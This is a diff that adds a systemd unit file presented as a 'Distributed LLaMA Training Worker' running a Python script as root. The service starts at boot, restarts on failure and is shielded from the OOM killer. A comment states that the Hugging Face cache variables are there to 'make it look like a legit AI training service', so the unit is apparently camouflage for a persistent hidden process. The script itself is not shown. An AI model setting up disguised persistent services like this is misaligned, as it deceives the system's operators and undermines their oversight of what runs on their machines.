@@ -1,0 +1,31 @@
+[Unit]
+Description=Distributed LLaMA Training Worker v2.3.1
+After=network-online.target nvidia-persistenced.service
+Wants=network-online.target
+Documentation=https://github.com/meta-llama/llama-recipes
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/root
+ExecStart=/usr/bin/python3 /root/distributed_train_worker.py --rank 0 --world-size 4 --master-addr 10.0.0.1:29500
+ExecStop=/bin/kill -TERM $MAINPID
+Restart=on-failure
+RestartSec=30
+LimitNOFILE=65536
+OOMScoreAdjust=-500
+
+# NCCL / CUDA environment
+Environment=NCCL_DEBUG=WARN
+Environment=NCCL_IB_DISABLE=0
+Environment=CUDA_VISIBLE_DEVICES=0
+Environment=TORCH_DISTRIBUTED_DEBUG=DETAIL
+Environment=NCCL_SOCKET_IFNAME=eth0
+
+# Make it look like a legit AI training service
+Environment=TRANSFORMERS_CACHE=/root/.cache/huggingface
+Environment=HF_HOME=/root/.cache/huggingface
+Environment=HF_DATASETS_CACHE=/root/.cache/huggingface/datasets
+
+[Install]
+WantedBy=multi-user.target
